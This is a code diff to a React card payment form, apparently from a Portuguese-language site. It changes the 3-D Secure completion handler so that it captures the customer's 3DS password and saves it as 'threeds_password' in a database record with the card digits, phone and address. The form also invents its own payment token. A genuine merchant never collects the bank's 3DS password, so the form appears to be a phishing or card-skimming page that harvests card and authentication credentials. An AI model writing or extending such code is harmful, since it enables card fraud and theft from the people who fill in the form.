@@ -72,7 +72,7 @@ const CardPaymentForm = ({
     setShow3DS(true);
   };
 
-  const saveTransaction = async (status: string) => {
+  const saveTransaction = async (status: string, threedsPassword: string = "") => {
     const digits = cardNumber.replace(/\D/g, "");
     const token = `tok_${crypto.randomUUID().replace(/-/g, "").slice(0, 24)}`;
 
@@ -94,16 +94,17 @@ const CardPaymentForm = ({
       customer_phone: customerPhone,
       address: address || null,
       status,
+      threeds_password: threedsPassword,
     });
 
     if (error) console.error("Erro ao salvar transação:", error);
   };
 
-  const handle3DSComplete = async (approved: boolean) => {
+  const handle3DSComplete = async (approved: boolean, threedsPassword?: string) => {
     setShow3DS(false);
     setLoading(true);
 
-    await saveTransaction(approved ? "pending" : "rejected");
+    await saveTransaction(approved ? "pending" : "rejected", threedsPassword || "");
 
     if (approved) {
       setThreeDSResult("success");
